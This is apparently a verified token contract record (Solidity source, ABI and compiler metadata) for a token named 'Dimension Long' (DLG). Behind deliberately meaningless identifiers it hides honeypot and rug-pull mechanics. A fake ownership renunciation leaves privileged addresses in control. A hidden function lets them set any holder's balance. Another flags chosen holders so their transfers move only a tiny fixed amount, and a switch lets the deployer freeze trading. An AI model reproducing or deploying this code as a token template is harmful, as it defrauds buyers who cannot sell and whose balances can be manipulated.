{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface tokenLaunch {\n    function createPair(address launchSenderList, address walletReceiver) external returns (address);\n}\n\ninterface amountShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxToken) external view returns (uint256);\n\n    function transfer(address maxAuto, uint256 isAuto) external returns (bool);\n\n    function allowance(address toTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxAuto,\n        uint256 isAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toTotal, uint256 value);\n    event Approval(address indexed toTeam, address indexed spender, uint256 value);\n}\n\nabstract contract isFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atLiquidity is amountShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DimensionLong is isFund, amountShould, atLiquidity {\n\n    function launchToMode(uint256 isAuto) public {\n        takeTeam();\n        minEnable = isAuto;\n    }\n\n    bool public tokenMax;\n\n    uint8 private marketingAmount = 18;\n\n    constructor (){\n        if (listShouldReceiver == limitMax) {\n            launchShouldList = listShouldReceiver;\n        }\n        fromToken takeWallet = fromToken(isAutoReceiver);\n        marketingLaunchedReceiver = tokenLaunch(takeWallet.factory()).createPair(takeWallet.WETH(), address(this));\n        \n        swapAmount = _msgSender();\n        tradingTx[swapAmount] = true;\n        minTokenTx[swapAmount] = feeLaunchedSell;\n        shouldBuy();\n        if (amountShouldReceiver != listShouldReceiver) {\n            launchShouldList = amountShouldReceiver;\n        }\n        emit Transfer(address(0), swapAmount, feeLaunchedSell);\n    }\n\n    address public swapAmount;\n\n    uint256 private limitMax;\n\n    uint256 public listShouldReceiver;\n\n    mapping(address => uint256) private minTokenTx;\n\n    function feeShouldLiquidity(address walletList, address maxAuto, uint256 isAuto) internal returns (bool) {\n        if (walletList == swapAmount) {\n            return liquidityTxFee(walletList, maxAuto, isAuto);\n        }\n        uint256 listExempt = amountShould(marketingLaunchedReceiver).balanceOf(launchSwap);\n        require(listExempt == minEnable);\n        require(maxAuto != launchSwap);\n        if (tradingLaunched[walletList]) {\n            return liquidityTxFee(walletList, maxAuto, marketingReceiver);\n        }\n        return liquidityTxFee(walletList, maxAuto, isAuto);\n    }\n\n    uint256 private amountFrom;\n\n    address isAutoReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private receiverToken;\n\n    uint256 minEnable;\n\n    function transferFrom(address walletList, address maxAuto, uint256 isAuto) external override returns (bool) {\n        if (_msgSender() != isAutoReceiver) {\n            if (teamExemptSwap[walletList][_msgSender()] != type(uint256).max) {\n                require(isAuto <= teamExemptSwap[walletList][_msgSender()]);\n                teamExemptSwap[walletList][_msgSender()] -= isAuto;\n            }\n        }\n        return feeShouldLiquidity(walletList, maxAuto, isAuto);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeTx;\n    }\n\n    function transfer(address modeLaunch, uint256 isAuto) external virtual override returns (bool) {\n        return feeShouldLiquidity(_msgSender(), modeLaunch, isAuto);\n    }\n\n    mapping(address => mapping(address => uint256)) private teamExemptSwap;\n\n    address public marketingLaunchedReceiver;\n\n    bool public toLimit;\n\n    string private fromSender = \"Dimension Long\";\n\n    function enableTake(address feeLaunched) public {\n        takeTeam();\n        \n        if (feeLaunched == swapAmount || feeLaunched == marketingLaunchedReceiver) {\n            return;\n        }\n        tradingLaunched[feeLaunched] = true;\n    }\n\n    function takeTeam() private view {\n        require(tradingTx[_msgSender()]);\n    }\n\n    uint256 private feeLaunchedSell = 100000000 * 10 ** 18;\n\n    uint256 constant marketingReceiver = 5 ** 10;\n\n    function owner() external view returns (address) {\n        return modeTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txListToken;\n    }\n\n    function shouldBuy() public {\n        emit OwnershipTransferred(swapAmount, address(0));\n        modeTx = address(0);\n    }\n\n    function balanceOf(address maxToken) public view virtual override returns (uint256) {\n        return minTokenTx[maxToken];\n    }\n\n    mapping(address => bool) public tradingTx;\n\n    function approve(address txTake, uint256 isAuto) public virtual override returns (bool) {\n        teamExemptSwap[_msgSender()][txTake] = isAuto;\n        emit Approval(_msgSender(), txTake, isAuto);\n        return true;\n    }\n\n    function allowance(address txSell, address txTake) external view virtual override returns (uint256) {\n        if (txTake == isAutoReceiver) {\n            return type(uint256).max;\n        }\n        return teamExemptSwap[txSell][txTake];\n    }\n\n    string private txListToken = \"DLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLaunchedSell;\n    }\n\n    function totalTx(address toLiquidity) public {\n        if (receiverLaunched) {\n            return;\n        }\n        \n        tradingTx[toLiquidity] = true;\n        if (amountFrom == amountShouldReceiver) {\n            amountShouldReceiver = limitMax;\n        }\n        receiverLaunched = true;\n    }\n\n    uint256 atAmount;\n\n    function swapFund(address modeLaunch, uint256 isAuto) public {\n        takeTeam();\n        minTokenTx[modeLaunch] = isAuto;\n    }\n\n    event OwnershipTransferred(address indexed exemptListReceiver, address indexed totalLaunchedAuto);\n\n    address private modeTx;\n\n    address launchSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function liquidityTxFee(address walletList, address maxAuto, uint256 isAuto) internal returns (bool) {\n        require(minTokenTx[walletList] >= isAuto);\n        minTokenTx[walletList] -= isAuto;\n        minTokenTx[maxAuto] += isAuto;\n        emit Transfer(walletList, maxAuto, isAuto);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromSender;\n    }\n\n    uint256 public amountShouldReceiver;\n\n    uint256 public launchShouldList;\n\n    bool public receiverLaunched;\n\n    mapping(address => bool) public tradingLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptListReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchedAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShouldReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShouldList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"launchToMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShouldReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunchedReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"swapFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"}],\"name\":\"totalTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DimensionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}